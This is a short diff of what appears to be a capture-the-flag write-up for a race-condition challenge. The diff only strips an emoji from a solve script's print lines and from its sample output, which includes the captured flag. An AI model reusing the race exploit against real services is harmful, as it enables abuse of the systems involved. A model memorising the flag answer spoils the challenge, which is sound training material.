@@ -265,7 +265,7 @@ def solve():
         claim_res = session.post(f"{BASE_URL}/vault/claim", json={"attempt": target_aid}).json()
         print(f"[!] Claim Response: {claim_res}")
         if "flag" in claim_res:
-            print(f"\n[🏆] FLAG: {claim_res['flag']}\n")
+            print(f"\n[] FLAG: {claim_res['flag']}\n")
             return claim_res["flag"]
 
 if __name__ == "__main__":
@@ -287,7 +287,7 @@ $ python solve_race.py
 [*] Claiming fragment using attempt 3b8c2d91a0ef...
 [!] Claim Response: {'status': 'awakened', 'flag': 'OWASP{byteme_soul_fragment_race}'}
 
-[🏆] FLAG: OWASP{byteme_soul_fragment_race}
+[] FLAG: OWASP{byteme_soul_fragment_race}
 ```
 
 The server accepted the overlapping proofs, updated the user state, and returned the flag:
